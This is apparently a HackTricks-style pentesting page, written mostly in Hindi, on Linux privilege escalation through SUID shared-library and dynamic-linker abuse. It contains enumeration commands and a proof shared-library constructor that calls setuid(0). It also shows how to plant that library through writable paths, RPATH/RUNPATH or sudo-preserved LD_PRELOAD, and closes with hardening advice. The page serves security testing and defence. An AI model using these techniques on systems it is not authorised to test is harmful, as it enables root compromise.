# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries की आमतौर पर direct command execution के लिए समीक्षा की जाती है, लेकिन custom SUID programs dynamic linker के माध्यम से भी vulnerable हो सकते हैं। सामान्य theme सरल है: एक privileged executable ऐसे path या configuration से code load करता है, जिसे lower-privileged user प्रभावित कर सकता है।

यह page generic technique patterns पर केंद्रित है: missing libraries, writable library directories, `RPATH`/`RUNPATH`, sudo के माध्यम से `LD_PRELOAD`, linker configuration और SUID hardlink confusion।

## Fast Enumeration

असामान्य SUID files खोजने और यह जाँचने से शुरू करें कि वे dynamically linked हैं या नहीं:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
गैर-मानक locations, custom application paths, package-managed directories के बाहर root के स्वामित्व वाली binaries और writable directories से load की जाने वाली dependencies पर ध्यान दें।

उपयोगी writeability checks:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

कुछ custom SUID binaries ऐसे shared object को load करने का प्रयास करते हैं जो मौजूद नहीं होता। यदि missing path attacker द्वारा नियंत्रित directory के अंतर्गत है, तो binary attacker-supplied code को effective user के रूप में load कर सकती है।

असफल library lookups खोजें:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
यदि binary `libexample.so` के लिए writable path में search करती है, तो एक minimal proof library constructor का उपयोग कर सकती है। Validation के दौरान proof-of-impact को harmless रखें:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
इसे उसी exact filename के साथ build करें जिसे binary load करने का प्रयास करती है:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
शोषण योग्य स्थिति केवल missing library नहीं है। Attacker के पास privileged loader द्वारा स्वीकार किए जाने वाले path पर compatible shared object रखने की क्षमता भी होनी चाहिए।

## Writable Library Directory

कभी-कभी सभी dependencies मौजूद होती हैं, लेकिन उन्हें resolve करने के लिए उपयोग की जाने वाली directories में से कोई एक writable होती है। इससे loaded library को replace करना या उसी name वाली higher-priority library को plant करना संभव हो सकता है।

Dependency paths की समीक्षा करें:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
यदि directory writable है, तो lab में copy-safe approach से validate करें। Live host पर system libraries को replace करने से authentication, package management या boot-critical services काम करना बंद कर सकती हैं।

## RPATH और RUNPATH

`RPATH` और `RUNPATH` dynamic-section entries हैं, जो loader को बताते हैं कि libraries के लिए कहाँ search करना है। जब वे attacker-writable directories की ओर point करते हैं, तो SUID programs में ये dangerous होते हैं।

उन्हें detect करें:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
जोखिमपूर्ण आउटपुट का उदाहरण:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
यदि `/opt/app/lib` writable है और binary को `libcustom.so` की आवश्यकता है, तो attacker वहाँ एक malicious `libcustom.so` रख सकता है:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` और `RUNPATH` सभी resolution details में identical नहीं होते, लेकिन privilege-escalation review के लिए practical question समान है: क्या SUID binary किसी library name के लिए attacker-writable directory में search करती है?

## LD_PRELOAD, LD_LIBRARY_PATH और SUID

Normal programs के लिए, `LD_PRELOAD` और `LD_LIBRARY_PATH` shared object loading को force या influence कर सकते हैं। SUID programs के लिए, dynamic loader सामान्यतः secure-execution mode में प्रवेश करता है और dangerous environment variables को ignore करता है।

इसका अर्थ है कि कोई plain SUID binary केवल इसलिए आमतौर पर vulnerable नहीं होती क्योंकि user `LD_PRELOAD` set कर सकता है:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
सामान्य अपवाद sudo misconfiguration है। यदि `sudo -l` दिखाता है कि `LD_PRELOAD` या `LD_LIBRARY_PATH` जैसे variable को preserve किया गया है, तो sudo-allowed command attacker-controlled code लोड कर सकता है:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
इन मामलों को भ्रमित न करें:

- सामान्य SUID binary के विरुद्ध `LD_PRELOAD`: आमतौर पर secure execution द्वारा blocked होता है।
- sudo द्वारा संरक्षित `LD_PRELOAD`: संभावित रूप से exploitable।
- writable path में missing `.so`: तब exploitable होता है जब SUID binary स्वाभाविक रूप से उस path को load करती है।
- writable directory की ओर `RPATH`/`RUNPATH`: तब exploitable होता है जब किसी आवश्यक library को नियंत्रित किया जा सके।
- `/etc/ld.so.preload` या linker config पर write access: system-wide और high impact।

## Linker Configuration

dynamic linker `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache और कुछ मामलों में `/etc/ld.so.preload` जैसी system configuration भी पढ़ता है।

High-value checks:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration आमतौर पर किसी एक vulnerable SUID binary से अधिक गंभीर होती है, क्योंकि यह कई dynamically linked processes को प्रभावित कर सकती है। `/etc/ld.so.preload` विशेष रूप से खतरनाक है, क्योंकि यह privileged processes में किसी shared object को force कर सकती है।

## SUID Hardlink Confusion

Hardlinks एक ही SUID inode को कई नामों के अंतर्गत दिखा सकते हैं। यह किसी privileged helper को छिपाने, cleanup को भ्रमित करने या naive path-based review को bypass करने के लिए उपयोगी है।

एक से अधिक link वाली SUID files खोजें:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
समान inode के सभी paths का निरीक्षण करें:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
The abuse यह नहीं है कि hardlink permissions बदलता है। Abuse path confusion है: किसी privileged inode तक ऐसे name के माध्यम से पहुँचा जा सकता है जिसकी defenders या scripts अपेक्षा नहीं करते। गहरे inode और hardlink workflow के लिए [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) देखें।

## रक्षात्मक टिप्पणियाँ

- SUID binaries को minimal, audited और जहाँ संभव हो package-managed रखें।
- writable या application-managed directories की ओर संकेत करने वाली `RPATH`/`RUNPATH` entries से बचें।
- library directories को root-owned रखें और regular users द्वारा writable न होने दें।
- sudo के माध्यम से `LD_PRELOAD`, `LD_LIBRARY_PATH` या समान loader variables को preserve न करें।
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` और unexpected SUID files को monitor करें।
- hardlinked SUID files की समीक्षा करें और standard system paths के बाहर मौजूद custom SUID wrappers की जाँच करें।
